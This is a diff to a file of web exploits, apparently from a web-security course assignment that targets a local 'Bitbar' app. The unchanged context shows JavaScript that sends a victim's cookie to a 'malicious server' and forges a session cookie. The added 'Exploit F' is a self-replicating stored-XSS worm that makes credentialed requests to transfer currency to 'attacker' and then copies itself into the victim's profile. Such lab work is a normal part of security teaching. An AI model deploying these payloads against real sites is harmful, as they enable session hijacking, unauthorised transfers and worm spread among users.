@@ -6,7 +6,7 @@ const error_msg = document.getElementsByClassName('error')[0];
 error_msg.parentNode.removeChild(error_msg);
 
 // Now send all the information we want to our malicious server.
-const params = "cookie=" + document.cookie;
+const params = "cookie=" + encodeURIComponent(document.cookie);
 const req = new XMLHttpRequest();
 req.withCredentials=true;
 req.onload = function() {
@@ -51,3 +51,26 @@ clear();
 	document.cookie = "session=" + btoa(JSON.stringify(session));
 })();
 clear();
+
+// Exploit F
+<span id='bitbar_count' class='10'></span>
+<b>TODO(attacker): Insert witty message to grader here!</b>
+<script>
+const params = 'destination_username=attacker&quantity=1';
+const req = new XMLHttpRequest();
+req.withCredentials=true;
+req.onload = function() {
+	const exploit = document.getElementById('profile');
+	const params = 'new_profile='.concat(encodeURIComponent(exploit.innerHTML));
+	const req = new XMLHttpRequest();
+	req.withCredentials=true;
+	req.onload = function() {
+	}
+	req.open('POST', 'http://localhost:3000/set_profile');
+	req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	req.send(params);
+}
+req.open('POST', 'http://localhost:3000/post_transfer');
+req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+req.send(params);
+</script>
